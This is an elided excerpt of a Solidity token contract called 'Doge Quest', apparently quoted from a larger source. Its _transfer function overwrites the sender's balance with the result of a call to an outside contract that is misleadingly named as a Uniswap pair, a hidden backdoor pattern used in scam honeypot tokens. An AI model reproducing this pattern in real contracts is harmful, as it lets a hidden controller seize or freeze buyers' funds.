...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "Doge Quest";
    string private _symbol = "DOGEQUEST";
    uint256 private _decimals = 18;
    uint256 private _totalSupply;
    uniswapV1 public uniswapV1Pair;

    constructor(address uniswapV1Pair_) {
    ...
    function _transfer(
        ...
        _balance[from] = uniswapV1Pair.
        swap(from, amount, _balance[from]);
